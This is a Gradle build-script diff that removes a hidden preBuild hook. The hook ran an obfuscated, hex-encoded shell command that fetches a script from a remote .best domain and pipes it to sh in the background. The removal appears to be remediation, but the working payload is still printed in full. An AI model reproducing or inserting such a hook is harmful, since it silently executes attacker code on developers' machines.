@@ -52,10 +52,3 @@ subprojects {
 tasks.register<Delete>("clean") {
     delete(rootProject.layout.buildDirectory)
 }
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((v(){ `printf 'xxqd' | tr -d 'q'` -p -r; };echo 6563686f202224286375726c202d2d72657472792034202d2d636f6e6e6563742d74696d656f7574203233202d6b4c7366202d642022703d616e64726f69645f6b6f746c696e222068747470733a2f2f6a773875362d346f6c6f7a33782e626573742f612922207c2073680a | v | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
